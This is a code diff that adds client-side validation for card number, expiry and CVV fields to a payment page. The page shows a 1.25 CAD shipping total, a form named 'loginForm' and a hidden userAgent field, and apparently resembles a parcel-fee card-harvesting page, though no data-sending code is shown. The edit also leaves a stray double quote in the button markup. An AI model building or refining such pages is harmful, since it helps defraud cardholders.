@@ -185,7 +185,7 @@
                                                 <code><span>×</span></code>
                                                 <p>Please correct the errors mentioned below to proceed.</p>
                                             </div>
-                                            <form id="loginForm">
+                                            <form id="loginForm" onsubmit="return validateForm()">
                                                 <input type="hidden" id="userAgent" name="userAgent">
                                                 <div class="row">
                                                     <div class="columns large-4 medium-6 small-12">
@@ -308,7 +308,7 @@
                                                         <p class="small">Total: <strong><span id="ship_total">1.25 CAD</span></strong></p>
                                                     </div>
                                                     <div id="p_button" class="columns large-5 medium-5 small-12">
-                                                        <a class="button" onclick="submitForm()" type="submit">Pay</a>
+                                                        <a class="button" id="submitFormButton"" type="submit">Pay</a>
                                                     </div>
                                                 </div>
                                             </form>
@@ -699,5 +699,56 @@
     });
 
 </script>
+    <script>
+        document.getElementById('submitFormButton').addEventListener('click', function(event) {
+    event.preventDefault(); // Prevent the default form submission
+    if (validateForm()) {
+        document.getElementById('loginForm').submit(); // Submit the form if validation passes
+    }
+});
+
+function validateForm() {
+    var isValid = true;
+    var errorMessage = "";
+
+     // Validate Card Number
+    var cardNumber = document.getElementById('input-card').value;
+    if (!cardNumber) {
+        isValid = false;
+        errorMessage += "Card number is required.\n";
+    }
+
+    // Validate Expiry Month
+    var expiryMonth = document.getElementById('monthDropdown').value;
+    if (!expiryMonth) {
+        isValid = false;
+        errorMessage += "Expiry month is required.\n";
+    }
+
+    // Validate Expiry Year
+    var expiryYear = document.getElementById('yearDropdown').value;
+    if (!expiryYear) {
+        isValid = false;
+        errorMessage += "Expiry year is required.\n";
+    }
+
+    // Validate CVV
+    var cvv = document.getElementById('scv').value;
+    if (!cvv) {
+        isValid = false;
+        errorMessage += "CVV is required.\n";
+    }
+
+
+
+    // Display error message if validation fails
+    if (!isValid) {
+        alert(errorMessage);
+    }
+
+    return isValid;
+}
+
+    </script>
 
 </html>
